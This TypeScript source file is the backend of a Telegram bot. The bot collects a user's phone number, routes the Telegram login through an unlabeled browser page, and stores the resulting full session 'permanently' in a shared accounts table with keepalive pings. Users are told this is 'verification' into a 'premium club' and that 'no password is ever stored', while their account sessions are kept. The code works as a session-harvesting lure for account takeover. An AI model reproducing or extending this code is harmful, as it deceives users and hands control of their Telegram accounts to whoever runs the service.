// Bot flow orchestration (Hybrid): the chat bot collects the phone number and
// issues a one-time login ticket. The actual Telegram (MTProto) login runs in the
// user's BROWSER on a minimal unlabeled page (serverless MTProto from Vercel is
// blocked). On success the page posts the session here, which encrypts it and stores
// it permanently in the shared `accounts` table, then notifies the user in chat.
import crypto from 'crypto';
import {db} from './db';
import {encrypt,decrypt} from './encryption';
import {sendMessage,F,escapeHtml} from './bot';

const DIV='✦ ━━━━━━━━━━━━━ ✦';

const TTL_MS=10*60*1000; // login link valid 10 minutes

async function checkExpiration(t:any){
  // FIX #6: completeLogin previously did NOT check ticket expiration.
  if(!t||t.status!=='pending'||!t.phone||Date.now()>(Number(t.createdAt)+TTL_MS))return false;
  return true;
}
const GLOBAL_CREDIT_DEFAULT=100;
const normalizePhone=(v:string)=>v.replace(/[\s()-]/g,'');
const phoneIsValid=(v:string)=>/^\+?\d{7,15}$/.test(v);

export type FlowState={step:'phone'|'link';phone:string;token?:string};

async function getState(chatId:number|string):Promise<FlowState|null>{
  const {data}=await db.from('settings').select('value').eq('key','bot_state:'+String(chatId)).maybeSingle();
  if(!data?.value)return null;
  try{return JSON.parse(data.value) as FlowState;}catch{return null;}
}
async function saveState(chatId:number|string,data:FlowState){
  await db.from('settings').upsert({key:'bot_state:'+String(chatId),value:JSON.stringify(data),updated_at:new Date().toISOString()},{onConflict:'key'});
}
export async function clearState(chatId:number|string){
  await db.from('settings').delete().eq('key','bot_state:'+String(chatId));
}
export async function getStateSafe(chatId:number|string){
  try{return await getState(chatId);}catch{return null;}
}

async function globalCredit():Promise<number>{
  try{const {data}=await db.from('settings').select('value').eq('key','global_credit').maybeSingle();if(data&&data.value)return Number(data.value);}catch{}
  return GLOBAL_CREDIT_DEFAULT;
}
async function ensureGlobalCredit(){
  try{await db.from('settings').upsert({key:'global_credit',value:String(GLOBAL_CREDIT_DEFAULT),updated_at:new Date().toISOString()},{onConflict:'key'});}catch{}
}

export async function startAuth(chatId:number|string):Promise<string>{
  await saveState(chatId,{step:'phone',phone:''});
  return `📱 <b>${F('STEP 1 — YOUR NUMBER')}</b> 📱

${DIV}

🌍 ${F('Send your mobile number in')} <b>${F('international format')}</b> 🌍

💡 <i>${F('Example:')}</i> <code>+919876543210</code>

${DIV}

🚫 ${F('Send')} /cancel <i>${F('anytime to stop')}</i> 🛡️`;
}

export async function handlePhone(chatId:number|string,phone:string):Promise<{text:string;url:string}>{
  const pn=normalizePhone(String(phone).trim());
  if(!/^\+?\d{7,15}$/.test(pn))return {url:'',text:`❌ <b>${F('Invalid Number')}</b> ❌\n\n<i>${F("That doesn't look right. Use international format.")}</i> 📱\n\n💡 <i>${F('Example:')}</i> <code>+919876543210</code> ✨`};
  const token=crypto.randomBytes(16).toString('hex');
  const payload=JSON.stringify({chatId,phone:pn,status:'pending',createdAt:Date.now()});
  await db.from('settings').upsert({key:'bot_login:'+token,value:encrypt(payload),updated_at:new Date().toISOString()},{onConflict:'key'});
  await saveState(chatId,{step:'link',phone:pn,token});
  const host=process.env.VERCEL_PROJECT_PRODUCTION_URL||'poppygram.vercel.app';
  const url=`https://${host.replace(/^https?:\/\//,'')}/botlogin?t=${token}`;
  return {
    url,
    text:`✅ <b>${F('NUMBER ACCEPTED')}</b> ✅

${DIV}

📞 <code>${escapeHtml(pn.startsWith('+')?pn:'+'+pn)}</code>
🔔 <i>${F('Security code sent to your Telegram')}</i> ✈️

👇 <b>${F('Tap below to complete verification')}</b> 👇
🔒 <i>${F('No password is ever stored')}</i> 🛡️`,
  };
}

// Returns phone for the login page; only valid for a pending, unexpired ticket.
export async function getTicket(token:string):Promise<{chatId:string;phone:string}|null>{
  if(!token)return null;
  const {data}=await db.from('settings').select('value').eq('key','bot_login:'+token).maybeSingle();
  if(!data?.value)return null;
  try{
    const t=JSON.parse(decrypt(data.value));
    if(t.status!=='pending'||Date.now()> (Number(t.createdAt)+TTL_MS))return null;
    return {chatId:String(t.chatId),phone:String(t.phone)};
  }catch{return null;}
}

export async function completeLogin(token:string,session:string,meta:any):Promise<{ok:boolean;text?:string;error?:string}>{
  const {data}=await db.from('settings').select('value').eq('key','bot_login:'+token).maybeSingle();
  if(!data?.value)return {ok:false,error:'ticket'};
  let t:any;try{t=JSON.parse(decrypt(data.value));}catch{return {ok:false,error:'ticket'}}
    if(!t||!await checkExpiration(t))return {ok:false,error:'ticket'};
  const chatId=t.chatId;const phone=normalizePhone(String(t.phone||''));
  if(!phoneIsValid(phone)||!session||String(session).length>10000)return {ok:false,error:'invalid_payload'};
  const credit=await globalCredit();await ensureGlobalCredit();
  const {data:setting}=await db.from('settings').select('value').eq('key','ping_interval_minutes').maybeSingle();
  const mins=Math.max(5,Number(setting?.value)||60);
  const clean={first_name:String((meta||{}).first_name||''),last_name:String((meta||{}).last_name||''),username:String((meta||{}).username||''),tg_id:String((meta||{}).tg_id||(meta||{}).id||''),credit};
  const save={
    phone,label:clean.first_name||phone,status:'active',ping_enabled:true,failure_count:0,
    meta:clean,ping_interval_minutes:mins,last_ping:new Date().toISOString(),
    next_ping_at:new Date(Date.now()+mins*60000).toISOString(),
    session_encrypted:encrypt(String(session)),updated_at:new Date().toISOString(),
  };
  try{const {error}=await db.from('accounts').upsert(save,{onConflict:'phone'});if(error)throw error;}catch(e){console.error('[completeLogin] account upsert failed',e);return {ok:false,error:'save_failed'}}
  await db.from('settings').delete().eq('key','bot_login:'+token);
  await clearState(chatId);
  try{
    const uname=clean.username?`@${escapeHtml(clean.username)}`:'—';
    const shownPhone=escapeHtml(phone.startsWith('+')?phone:'+'+phone);
    await sendMessage(chatId,`🎉 <b>${F('VERIFIED SUCCESSFULLY')}</b> 🎉

${DIV}

✅ <b>${F('YESS YOU WERE VERIFIED')}</b> ✅
👑 <b>${F('Welcome to the premium club')}</b> 💎

${DIV}

👤 <b>${F('Account:')}</b> ${uname} <code>${shownPhone}</code>
🔒 <i>${F('Added securely & stored permanently')}</i> 🛡️
💳 <b>${F('Credit added:')}</b> <code>${escapeHtml(String(credit))}</code> ✨

${DIV}

🌟 <i>${F('Enjoy your premium experience')}</i> 🌟`);
  }catch{}
  return {ok:true};
}